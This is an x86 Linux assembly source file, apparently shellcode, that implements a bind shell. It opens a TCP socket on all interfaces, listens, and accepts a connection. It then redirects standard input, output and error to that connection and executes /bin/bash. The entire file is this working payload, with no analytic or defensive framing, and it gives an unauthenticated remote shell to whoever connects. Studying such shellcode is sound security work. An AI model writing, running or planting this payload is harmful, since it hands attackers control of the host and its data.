section .text
global main

main:
    xor edx, edx    ; Zero-out EDX for later use
    ; sockfd = socket(PF_INET, SOCK_STREAM, 0)
    mov eax, edx    ; Zero-out EAX
    mov ebx, edx    ; Zero-out EBX
    mov al, 0x66    ; SYS_SOCKETCALL
    mov bl, 0x1     ; SYS_SOCKET
    push edx        ; 3rd argument 0
    push byte 0x1   ; 2nd argument SOCK_STREAM
    push byte 0x2   ; 1st argument PF_INET
    mov ecx, esp    ; Address of socket arguments
    int 0x80        ; Exec syscall

    ; We need the result later
    mov esi, eax    ; Store ref to sockfd in ESI

    ; bind(sockid, struct addr, len addr)
    mov eax, edx    ; Zero-out EAX
    mov ebx, edx    ; Zero-out EBX
    mov al, 0x66    ; SYS_SOCKETCALL
    mov bl, 0x2     ; SYS_BIND
    ; Setup struct addr
    push edx        ; 0.0.0.0
    sub esp, 2      ; Move ESP so we don't overwrite ip-addr
    mov byte [esp], 0x1c    ; Push first byte for port
    mov byte [esp+1], dl    ; Push second byte for port
    push word 0x2   ; AF_INET
    mov ecx, esp    ; Store struct in ECX
    ; Setup bind arguments
    push 0x10       ; Addr length (16)
    push ecx        ; Struct addr
    push esi        ; Ref to sockfd
    mov ecx, esp    ; Address of bind arguments
    int 0x80        ; Exec syscall

    ; listen(sockid, 2)
    mov eax, edx    ; Zero-out EAX
    mov ebx, edx    ; Zero-out EBX
    mov al, 0x66    ; SYS_SOCKETCALL
    mov bl, 0x4     ; SYS_LISTEN
    ; Setup arguments
    push byte 0x2   ; 2
    push esi        ; Ref to sockid
    mov ecx, esp    ; Address of listen arguments
    int 0x80        ; Exec syscall

    ; socketid = accept(sockfd, null, null)
    mov eax, edx    ; Zero-out EAX
    mov ebx, edx    ; Zero-out EBX
    mov al, 0x66    ; SYS_SOCKETCALL
    mov bl, 0x5     ; SYS_ACCEPT
    push edx        ; NULL
    push edx        ; 0
    push esi        ; Ref to sockid
    mov ecx, esp    ; Address of arguments
    int 0x80

    ; dup2(socketid, 0)
    mov ebx, eax    ; Ref to socketid
    xor eax, eax    ; Zero-out EAX
    xor ecx, ecx    ; Zero-out ECX
    mov al, 0x3f    ; SYS_DUP2
    int 0x80        ; Exec syscall
    ; dup2(socketid, 1)
    xor eax, eax    ; Zero-out EAX
    mov al, 0x3f    ; SYS_DUP2
    inc ecx         ; 1
    int 0x80        ; Exec syscall
    ;dup2(socketid, 2)
    xor eax, eax    ; Zero-out EAX
    mov al, 0x3f    ; SYS_DUP2
    inc ecx         ; 2
    int 0x80        ; Exec syscall

    ; execve("////bin/bash", NULL, NULL)
    xor eax, eax    ; Zero-out EAX
    mov al, 0x0b    ; SYS_EXECVE
    push edx        ; NULL-character on stack
    push 0x68736162 ; "hsab"
    push 0x2f6e6962 ; "/nib"
    push 0x2f2f2f2f ; "////"
    mov ebx, esp    ; Ref to "////bin/bash" from stack
    mov ecx, edx    ; NULL
    int 0x80

    ; Exit
    ;xor eax, eax
    ;mov al, 0x1
    ;int 0x80